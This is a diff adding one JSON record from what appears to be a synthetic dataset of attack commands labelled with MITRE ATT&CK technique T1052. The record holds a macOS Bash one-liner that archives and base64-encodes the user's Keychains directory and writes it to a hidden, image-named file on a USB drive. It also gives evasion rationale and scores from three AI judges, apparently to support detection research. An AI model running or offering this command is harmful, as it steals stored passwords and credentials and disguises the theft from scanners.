@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - ~/Library/Keychains | base64 > /Volumes/USB/DCIM/.IMG0012.JPG",
+  "explanation": "Packages sensitive keychain data into a base64-encoded blob disguised with an image-like name on the USB drive.",
+  "rationale_steps": [
+    "Archive and compress target files entirely locally.",
+    "Base64-encode to avoid content-based scanners and binary signatures.",
+    "Write to removable media with an inconspicuous filename.",
+    "No network channels are used; data is staged for physical exfil."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-0e9dcbd5",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with valid tar and base64 flags, correct piping and redirection, and no quoting or syntax issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It archives and base64-encodes the user's Keychains directory and writes it to a hidden, image-like filename on a USB path, consistent with physical-media exfiltration, contingent on the USB/DCIM path existing and read permissions to the Keychains directory.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:28:56.886628Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper pipe syntax, valid tar flags, correct base64 redirection, and a properly specified output path.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by compressing the macOS keychain data (which contains passwords and credentials), encoding it to avoid detection, and exfiltrating it to a USB drive with a filename disguised as an image in a camera directory.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:28:59.712389Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid commands, flags, proper piping, and redirection without any syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by packaging sensitive keychain data, encoding it with base64, and writing it to a mounted USB drive with a hidden, image-disguised filename, directly aligning with T1052.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:29:08.242045Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
